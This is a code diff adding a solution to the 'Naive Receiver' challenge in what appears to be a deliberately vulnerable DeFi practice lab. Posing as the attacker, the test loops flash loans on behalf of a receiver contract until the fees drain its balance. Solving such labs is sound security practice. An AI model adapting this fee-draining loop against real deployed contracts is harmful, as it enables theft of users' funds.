@@ -51,8 +51,22 @@ contract NaiveReceiver is DSTest {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testNaiveExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        uint256 poolFee = naiveReceiverLenderPool.fixedFee();
+
+        while (true) {
+            uint256 fundsToDrain = address(flashLoanReceiver).balance - poolFee;
+            naiveReceiverLenderPool.flashLoan(
+                address(flashLoanReceiver),
+                fundsToDrain
+            );
+
+            if (address(flashLoanReceiver).balance == 0) break;
+        }
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
